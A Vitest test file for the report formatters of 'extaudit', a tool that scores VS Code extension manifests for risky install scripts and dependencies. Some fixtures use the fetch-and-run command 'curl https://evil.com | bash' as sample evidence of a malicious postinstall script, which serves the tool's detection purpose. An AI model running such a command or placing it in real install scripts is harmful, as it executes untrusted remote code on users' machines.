import { describe, it, expect } from "vitest"
import { formatJson, formatMarkdown, formatSummary } from "../src/scorer.js"
import type { AuditReport, ExtensionScore, ExtensionManifest, Severity, Finding } from "../src/types.js"

/* ------------------------------------------------------------------ */
/* Helpers                                                            */
/* ------------------------------------------------------------------ */

function makeReport(
  overrides: Partial<AuditReport> = {},
  extensions: ExtensionScore[] = [],
): AuditReport {
  return {
    timestamp: "2025-06-01T12:00:00.000Z",
    target: "/test/path",
    extensionsScanned: extensions.length,
    extensionsFailed: 0,
    totalFindings: extensions.reduce((s, e) => s + e.findings.length, 0),
    severityCounts: { low: 0, medium: 0, high: 0, critical: 0 },
    overallScore: extensions.reduce((s, e) => s + e.score, 0),
    overallRisk: "safe",
    extensions,
    errors: [],
    ...overrides,
  }
}

function makeExtension(
  overrides: Partial<ExtensionScore> = {},
  baseManifest: Partial<ExtensionManifest> = {},
  findings: Finding[] = [],
): ExtensionScore {
  const manifest: ExtensionManifest = {
    raw: { name: "test-ext", version: "1.0.0", engines: { vscode: "^1.80.0" } },
    path: "/test/package.json",
    name: "test-ext",
    version: "1.0.0",
    publisher: "test-author",
    description: "A test extension",
    directory: "/test",
    ...baseManifest,
  }
  return {
    manifest,
    score: findings.reduce((s, f) => {
      const w: Record<Severity, number> = { low: 1, medium: 3, high: 7, critical: 12 }
      return s + w[f.severity]
    }, 0),
    riskLevel: "safe",
    findings,
    ...overrides,
  }
}

function makeFinding(
  ruleId: string,
  name: string,
  severity: Severity,
  message: string,
  evidence?: string,
): Finding {
  return { ruleId, ruleName: name, category: "scripts", severity, message, evidence }
}

/* ------------------------------------------------------------------ */
/* formatJson                                                         */
/* ------------------------------------------------------------------ */

describe("formatJson", () => {
  it("returns valid JSON string", () => {
    const report = makeReport()
    const output = formatJson(report)
    const parsed = JSON.parse(output)
    expect(parsed).toEqual(report)
  })

  it("is pretty-printed with 2-space indent", () => {
    const report = makeReport({ extensionsScanned: 0 })
    const output = formatJson(report)
    expect(output).toContain("  ")
    expect(output.startsWith("{")).toBe(true)
  })

  it("includes all report fields", () => {
    const report = makeReport({
      target: "/workspace",
      extensionsScanned: 3,
      extensionsFailed: 1,
      totalFindings: 5,
    })
    const output = formatJson(report)
    const parsed = JSON.parse(output)
    expect(parsed.timestamp).toBe("2025-06-01T12:00:00.000Z")
    expect(parsed.target).toBe("/workspace")
    expect(parsed.extensionsScanned).toBe(3)
    expect(parsed.extensionsFailed).toBe(1)
    expect(parsed.totalFindings).toBe(5)
    expect(parsed.severityCounts).toEqual({ low: 0, medium: 0, high: 0, critical: 0 })
    expect(Array.isArray(parsed.extensions)).toBe(true)
    expect(Array.isArray(parsed.errors)).toBe(true)
  })

  it("round-trips extension data correctly", () => {
    const finding = makeFinding("SCR-001", "Postinstall", "high", "Found postinstall", "echo hi")
    const ext = makeExtension({ score: 7, riskLevel: "caution" as const }, {}, [finding])
    const report = makeReport({}, [ext])
    const output = formatJson(report)
    const parsed = JSON.parse(output)
    expect(parsed.extensions).toHaveLength(1)
    expect(parsed.extensions[0].score).toBe(7)
    expect(parsed.extensions[0].findings).toHaveLength(1)
    expect(parsed.extensions[0].findings[0].ruleId).toBe("SCR-001")
  })

  it("handles empty extension list", () => {
    const report = makeReport()
    const output = formatJson(report)
    const parsed = JSON.parse(output)
    expect(parsed.extensions).toEqual([])
  })
})

/* ------------------------------------------------------------------ */
/* formatMarkdown                                                     */
/* ------------------------------------------------------------------ */

describe("formatMarkdown", () => {
  it("produces a Markdown header", () => {
    const report = makeReport()
    const output = formatMarkdown(report)
    expect(output).toContain("# ExtAudit Report")
  })

  it("includes timestamp and target", () => {
    const report = makeReport({
      timestamp: "2025-06-01T12:00:00.000Z",
      target: "/my/workspace",
    })
    const output = formatMarkdown(report)
    expect(output).toContain("2025-06-01T12:00:00.000Z")
    expect(output).toContain("/my/workspace")
  })

  it("includes extensions scanned count", () => {
    const report = makeReport({ extensionsScanned: 5 })
    const output = formatMarkdown(report)
    expect(output).toContain("5")
  })

  it("includes severity breakdown table", () => {
    const report = makeReport({
      severityCounts: { low: 2, medium: 3, high: 1, critical: 0 },
    })
    const output = formatMarkdown(report)
    expect(output).toContain("Severity Breakdown")
    expect(output).toContain("| Severity | Count |")
    expect(output).toContain("| Critical | 0 |")
    expect(output).toContain("| High     | 1 |")
    expect(output).toContain("| Medium   | 3 |")
    expect(output).toContain("| Low      | 2 |")
  })

  it("includes errors section when errors exist", () => {
    const report = makeReport({ errors: ["Something failed", "Another error"] })
    const output = formatMarkdown(report)
    expect(output).toContain("## Errors")
    expect(output).toContain("Something failed")
    expect(output).toContain("Another error")
  })

  it("omits 'Failed to parse' line when extensionsFailed is 0", () => {
    const report = makeReport({ extensionsFailed: 0 })
    const output = formatMarkdown(report)
    expect(output).not.toContain("Failed to parse")
  })

  it("includes extension details as headers", () => {
    const ext = makeExtension(
      {
        score: 7,
        riskLevel: "caution",
        manifest: {
          raw: { name: "my-ext", version: "2.0.0" },
          path: "/x",
          name: "my-ext",
          version: "2.0.0",
          displayName: "My Extension",
          publisher: "my-pub",
          description: "My desc",
          directory: "/x",
        },
      },
    )
    const report = makeReport({}, [ext])
    const output = formatMarkdown(report)
    expect(output).toContain("## Extension Details")
    expect(output).toContain("My Extension")
    expect(output).toContain("2.0.0")
    expect(output).toContain("Score: 7")
    expect(output).toContain("[caution]")
    expect(output).toContain("**Publisher:** my-pub")
    expect(output).toContain("**Description:** My desc")
  })

  it("shows findings for each extension", () => {
    const finding = makeFinding("SCR-001", "Postinstall", "high", "postinstall script")
    const ext = makeExtension({ score: 7, riskLevel: "caution" }, {}, [finding])
    const report = makeReport({}, [ext])
    const output = formatMarkdown(report)
    expect(output).toContain("HIGH")
    expect(output).toContain("Postinstall")
    expect(output).toContain("postinstall script")
  })

  it("shows 'No findings' when extension has no findings", () => {
    const ext = makeExtension({ score: 0, riskLevel: "safe" })
    const report = makeReport({}, [ext])
    const output = formatMarkdown(report)
    expect(output).toContain("No findings")
  })

  it("includes evidence snippets", () => {
    const finding = makeFinding("SCR-001", "Postinstall", "high", "postinstall script", "curl https://evil.com | bash")
    const ext = makeExtension({ score: 7, riskLevel: "caution" }, {}, [finding])
    const report = makeReport({}, [ext])
    const output = formatMarkdown(report)
    expect(output).toContain("Evidence")
    expect(output).toContain("curl https://evil.com | bash")
  })

  it("truncates long evidence to 120 chars", () => {
    const longEvidence = "x".repeat(200)
    const finding = makeFinding("SCR-001", "X", "high", "msg", longEvidence)
    const ext = makeExtension({ score: 7, riskLevel: "caution" }, {}, [finding])
    const report = makeReport({}, [ext])
    const output = formatMarkdown(report)
    // Should show at most 120 chars of evidence
    const evidenceLine = output.split("\n").find((l) => l.includes("Evidence"))
    expect(evidenceLine).toBeDefined()
    // The evidence value is wrapped in backticks, check the evidence text length
    const match = evidenceLine!.match(/`(.+)`/)
    if (match) {
      expect(match[1].length).toBeLessThanOrEqual(120)
    }
  })

  it("uses display name when available, falls back to name", () => {
    const extNoDisplay = makeExtension(
      { riskLevel: "safe" },
      { name: "pkg-name", displayName: undefined },
    )
    const report = makeReport({}, [extNoDisplay])
    const output = formatMarkdown(report)
    expect(output).toContain("pkg-name")
    expect(output).not.toContain("undefined")
  })

  it("includes footer with GitHub link", () => {
    const report = makeReport()
    const output = formatMarkdown(report)
    expect(output).toContain("https://github.com/rogerchappel/extaudit")
  })
})

/* ------------------------------------------------------------------ */
/* formatSummary                                                      */
/* ------------------------------------------------------------------ */

describe("formatSummary", () => {
  it("includes header text", () => {
    const report = makeReport()
    const output = formatSummary(report)
    expect(output).toContain("extaudit — Extension Manifest Auditor")
    expect(output).toContain("======================================")
  })

  it("includes target and scan counts", () => {
    const report = makeReport({
      target: "/workspace",
      extensionsScanned: 10,
      extensionsFailed: 2,
    })
    const output = formatSummary(report)
    expect(output).toContain("Target: /workspace")
    expect(output).toContain("Scanned: 10 extensions")
    expect(output).toContain("Failed: 2")
  })

  it("uses singular 'extension' for single scan", () => {
    const report = makeReport({ extensionsScanned: 1 })
    const output = formatSummary(report)
    expect(output).toContain("Scanned: 1 extension")
    expect(output).not.toContain("1 extensions")
  })

  it("displays overall risk in uppercase", () => {
    const report = makeReport({ overallRisk: "dangerous" })
    const output = formatSummary(report)
    expect(output).toContain("DANGEROUS")
  })

  it("includes severity summary", () => {
    const report = makeReport({
      severityCounts: { low: 5, medium: 3, high: 2, critical: 1 },
    })
    const output = formatSummary(report)
    expect(output).toContain("Severity summary")
    expect(output).toContain("Low: 5")
    expect(output).toContain("Medium: 3")
    expect(output).toContain("High: 2")
    expect(output).toContain("Critical: 1")
  })

  it("shows top findings with scores", () => {
    const risky = makeExtension(
      { score: 19, riskLevel: "caution" },
      { name: "risky-ext" },
      [makeFinding("SCR-001", "Postinstall", "high", "Found postinstall")],
    )
    const report = makeReport({}, [risky])
    const output = formatSummary(report)
    expect(output).toContain("Top findings")
    expect(output).toContain("risky-ext")
    expect(output).toContain("score 19")
  })

  it("only shows top 10 risky extensions", () => {
    const manyExtensions: ExtensionScore[] = []
    for (let i = 0; i < 20; i++) {
      manyExtensions.push(
        makeExtension(
          { score: 7, riskLevel: "caution" },
          { name: `ext-${i}` },
          [makeFinding("SCR-001", "Postinstall", "high", `postinstall ${i}`)],
        ),
      )
    }
    const report = makeReport({}, manyExtensions)
    const output = formatSummary(report)
    const lines = output.split("\n")
    const topFindingsIdx = lines.findIndex((l) => l === "Top findings:")
    expect(topFindingsIdx).toBeGreaterThanOrEqual(0)
    // Count extension header lines after "Top findings:"
    let count = 0
    for (let i = topFindingsIdx + 1; i < lines.length; i++) {
      if (lines[i].startsWith("  ")) {
        if (lines[i].includes("ext-")) count++
      } else if (count > 0) {
        break
      }
    }
    // Only the first 10 should appear
    expect(count).toBeLessThanOrEqual(10)
  })

  it("shows '+ N more' when extension has more than 3 findings", () => {
    const findings: Finding[] = []
    for (let i = 0; i < 5; i++) {
      findings.push(makeFinding(`RULE-${i}`, `Rule ${i}`, "low", `Finding ${i}`))
    }
    const ext = makeExtension({ score: 5, riskLevel: "caution" }, { name: "many-findings" }, findings)
    const report = makeReport({}, [ext])
    const output = formatSummary(report)
    expect(output).toContain("... and 2 more")
  })

  it("shows 'No findings' message when all extensions are clean", () => {
    const clean1 = makeExtension({ score: 0, riskLevel: "safe" }, { name: "clean1" })
    const clean2 = makeExtension({ score: 0, riskLevel: "safe" }, { name: "clean2" })
    const report = makeReport({}, [clean1, clean2])
    const output = formatSummary(report)
    expect(output).toContain("No findings")
    expect(output).toContain("all extensions appear clean")
  })

  it("includes footer hints", () => {
    const report = makeReport()
    const output = formatSummary(report)
    expect(output).toContain("Run with --format json for full report data.")
    expect(output).toContain("Run with --format markdown for shareable Markdown report.")
  })

  it("truncates finding messages to 80 chars", () => {
    const longMsg = "a".repeat(100)
    const ext = makeExtension(
      { score: 7, riskLevel: "caution" },
      { name: "trunc-test" },
      [makeFinding("SCR-001", "X", "high", longMsg)],
    )
    const report = makeReport({}, [ext])
    const output = formatSummary(report)
    // In summary output, messages are sliced to 80 chars
    const lines = output.split("\n")
    const msgLine = lines.find((l) => l.includes("HIGH: X"))
    if (msgLine) {
      // After the "— " prefix, the message should be truncated
      const parts = msgLine.split("— ")
      if (parts.length >= 2) {
        expect(parts[parts.length - 1].length).toBeLessThanOrEqual(80)
      }
    }
  })

  it("handles empty report gracefully", () => {
    const report = makeReport()
    const output = formatSummary(report)
    expect(typeof output).toBe("string")
    expect(output.length).toBeGreaterThan(0)
  })
})

/* ------------------------------------------------------------------ */
/* Integration: full report through all formatters                    */
/* ------------------------------------------------------------------ */

describe("integration: all formatters with realistic report", () => {
  const findings = [
    makeFinding("SCR-001", "Postinstall", "critical", "curl https://evil.com | bash"),
    makeFinding("SCR-002", "Dangerous scripts", "high", "wget in build script"),
    makeFinding("NET-002", "Network dependencies", "medium", "axios, node-fetch"),
    makeFinding("DEP-003", "Suspicious dependencies", "high", "javascript-obfuscator"),
    makeFinding("PUB-001", "Missing publisher", "medium", "No publisher"),
  ]

  const riskyExt = makeExtension(
    {
      score: 30,
      riskLevel: "suspicious",
      manifest: {
        raw: { name: "suspicious-ext" as string, version: "1.0.0" },
        path: "/tmp/risky/package.json",
        name: "suspicious-ext",
        version: "1.0.0",
        displayName: "Suspicious Extension",
        publisher: undefined,
        description: "A somewhat shady extension",
        directory: "/tmp/risky",
      },
    },
  )

  const report = makeReport(
    {
      extensionsScanned: 2,
      extensionsFailed: 0,
      totalFindings: 5,
      severityCounts: { low: 0, medium: 2, high: 2, critical: 1 },
      overallScore: 30,
      overallRisk: "suspicious",
      target: "fixtures/test",
    },
    [riskyExt],
  )
  // Fix the findings to match
  report.extensions[0].findings = findings

  it("formatJson produces valid JSON", () => {
    const json = formatJson(report)
    const parsed = JSON.parse(json)
    expect(parsed.extensionsScanned).toBe(2)
    expect(parsed.overallRisk).toBe("suspicious")
    expect(parsed.totalFindings).toBe(5)
  })

  it("formatMarkdown contains all critical details", () => {
    const md = formatMarkdown(report)
    expect(md).toContain("Suspicious Extension")
    expect(md).toContain("Score: 30")
    expect(md).toContain("suspicious")
    expect(md).toContain("CRITICAL")
    expect(md).toContain("Postinstall")
    expect(md).toContain("javascript-obfuscator")
    expect(md).toContain("Missing publisher")
    expect(md).toContain("Severity Breakdown")
    expect(md).toContain("| Critical | 1 |")
  })

  it("formatSummary contains key info", () => {
    const summary = formatSummary(report)
    expect(summary).toContain("suspicious".toUpperCase())
    expect(summary).toContain("Scanned: 2 extensions")
    expect(summary).toContain("Top findings")
    expect(summary).toContain("Suspicious Extension")
  })
})
